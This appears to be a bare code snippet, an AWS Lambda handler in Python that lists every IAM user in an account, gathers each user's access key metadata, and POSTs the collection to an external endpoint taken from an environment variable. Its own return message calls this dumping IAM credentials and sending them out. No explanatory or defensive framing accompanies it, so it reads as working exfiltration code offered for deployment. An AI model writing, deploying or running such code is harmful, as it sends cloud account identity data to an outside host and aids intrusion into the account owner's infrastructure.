### Lambda Function Code (index.py)

```python
import json
import os
import boto3
import requests

def handler(event, context):
    iam = boto3.client('iam')
    users = iam.list_users()

    user_details = []
    for user in users['Users']:
        user_name = user['UserName']
        access_keys = iam.list_access_keys(UserName=user_name)
        user_details.append({
            'UserName': user_name,
            'AccessKeys': access_keys['AccessKeyMetadata']
        })

    external_endpoint = os.getenv('EXTERNAL_ENDPOINT')
    response = requests.post(external_endpoint, json=user_details)

    return {
        'statusCode': response.status_code,
        'body': json.dumps('IAM credentials dumped and sent to external endpoint')
    }
```

